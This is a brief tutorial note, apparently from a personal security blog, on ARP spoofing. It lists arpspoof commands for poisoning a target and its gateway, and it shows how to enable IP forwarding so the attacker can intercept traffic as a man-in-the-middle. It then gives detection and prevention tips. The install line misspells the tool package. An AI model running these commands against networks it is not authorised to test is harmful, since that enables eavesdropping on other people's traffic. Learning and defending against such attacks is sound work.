---
title: ARP Spoofing - Poisoning
date: 2024-01-28 14:15:56 -0600
---

````bash
sudo apt install dnssniff
arpspoof -i <interface> -t <target-ip> <router-ip>
arpspoof -i <interface> -t <gateway-ip> <target-ip>
````

The target device will not have access to the internet after running the above commands as our device is not an router and does not forward packets.  
Port Forwarding can be enabled using following command: `echo 1 > /proc/sys/net/ipv4/ip_forward`

### Prevention

#### ARP Poisoning
Manually check the ARP table for duplicate MAC Addresses  
**Xarp**: Application used to automatically detect ARP poisoning

#### Detect ARP Storm/ Poisoning
Wireshark - Protocol - ARP - Detect ARP Request Storm  
Analyze - Expert Information  
Alternate approach is to define Static ARP
